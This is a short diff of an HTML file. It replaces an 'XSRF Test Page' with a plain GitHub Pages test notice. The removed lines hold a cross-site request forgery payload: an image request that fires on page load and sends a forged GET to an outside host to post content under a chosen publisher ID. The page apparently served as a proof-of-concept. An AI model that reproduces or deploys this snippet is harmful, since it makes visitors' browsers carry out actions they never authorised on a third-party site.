@@ -2,14 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>XSRF Test</title>
+    <title>Test Page</title>
 </head>
 <body>
-    <h1>XSRF Test Page</h1>
-    <script>
-        // This script sends a GET request to the server as soon as the page is loaded
-        var img = new Image();
-        img.src = 'http://cyber.glitter.org.il/glit?id=-1&feed_owner_id=43499&publisher_id=43499&publisher_screen_name=ard%20ard&publisher_avatar=im6&background_color=White&date=2024-07-10T13:47:46.990Z&content=test&font_color=black';
-    </script>
+    <h1>GitHub Pages Test</h1>
+    <p>If you see this page, your GitHub Pages setup is working correctly!</p>
+    <p>This page is hosted using GitHub Pages.</p>
 </body>
 </html>
